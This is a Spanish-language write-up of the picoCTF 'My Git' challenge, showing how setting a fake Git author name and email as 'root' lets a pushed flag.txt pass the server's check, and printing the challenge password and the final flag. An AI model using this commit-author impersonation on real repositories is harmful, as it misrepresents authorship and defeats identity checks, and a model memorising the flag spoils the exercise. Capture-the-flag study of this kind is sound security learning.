# PicoCTF - My Git

## Descripción

I have built my own Git server with my own rules!

Se proporciona acceso a un repositorio Git remoto:

```bash
git clone ssh://git@foggy-cliff.picoctf.net:59044/git/challenge.git
```

Contraseña:

```text
32a53fa0
```

La pista dentro del README indica:

```text
Only flag.txt pushed by root:root@picoctf will be updated with the flag.
```

---

## Análisis

Al inspeccionar el repositorio se observa que únicamente contiene un archivo README con la pista principal.

La frase:

```text
Only flag.txt pushed by root:root@picoctf will be updated with the flag.
```

sugiere que el servidor verifica el autor del commit y la existencia de un archivo llamado `flag.txt`.

Git permite modificar localmente la identidad utilizada en los commits mediante la configuración de usuario y correo electrónico.

Por lo tanto, es posible crear un commit aparentando ser:

```text
root <root@picoctf>
```

---

## Procedimiento

Configurar la identidad del commit:

```bash
git config user.name "root"
git config user.email "root@picoctf"
```

Crear el archivo solicitado:

```bash
echo test > flag.txt
```

Agregar el archivo al repositorio:

```bash
git add flag.txt
```

Crear el commit:

```bash
git commit -m "add flag"
```

Enviar los cambios al servidor:

```bash
git push origin master
```

Respuesta del servidor:

```text
Author matched and flag.txt found in commit...
Congratulations! You have successfully impersonated the root user
Here's your flag:
```

---

## Flag

```text
picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
```

---

## Aprendizaje

- Funcionamiento básico de Git.
- Diferencia entre autenticación y metadatos de autor.
- Configuración de identidad mediante `git config`.
- Manipulación de autores en commits.
- Riesgos de confiar únicamente en los campos Author y Committer para verificar identidad.
- Uso de Git en retos CTF.
